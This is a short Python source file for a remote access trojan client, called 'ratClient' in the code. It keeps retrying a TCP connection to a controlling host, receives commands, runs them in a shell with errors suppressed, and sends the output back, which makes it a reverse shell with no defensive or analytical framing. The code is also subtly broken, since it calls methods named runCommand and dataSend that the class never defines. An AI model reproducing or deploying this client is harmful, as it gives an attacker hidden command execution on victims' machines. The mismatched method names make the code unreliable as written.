#Imports.
import socket, time, json, subprocess, base64, shutil, sys

#Make The Client Connect To The Host.
class Connector:
    def __init__(self, ip, port):
        while True:
            try:
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((ip, port))
            except socket.error:
                time.sleep(5)
            else:
                break

#Send Data Back To The Host. 
    def SendData(self, data):
        jsonData = json.dumps(data)
        self.connection.send(jsonData.encode())

#Recieve Data From The Host. 
    def dataReceive(self):
        jsonData = b""
        while True:
            try:
                jsonData += self.connection.recv(1024)
                return json.loads(jsonData)
            except ValueError:
                continue

#Convert Array To String.
    def arrayToString(self, s):
        convStr = ""
        for i in s:
            convStr += i
        return convStr

#Makes A Automatic Shell For Command Execution.
    def AutoShell(self, command):
        return subprocess.check_output(
            command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
        )

#Run For Command Execution.
    def run(self):
        while True:
            command = self.dataReceive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                else:
                    convCommand = self.arrayToString(command)
                    commandResponse = self.runCommand(convCommand).decode()
            # Whole error handling, bad practice but required to keep connection
            except Exception as e:
                commandResponse = (
                    f"[-] Error running command: {e}"
                )
            self.dataSend(commandResponse)

ratClient = Connector("127.0.0.1", 7976)
ratClient.run()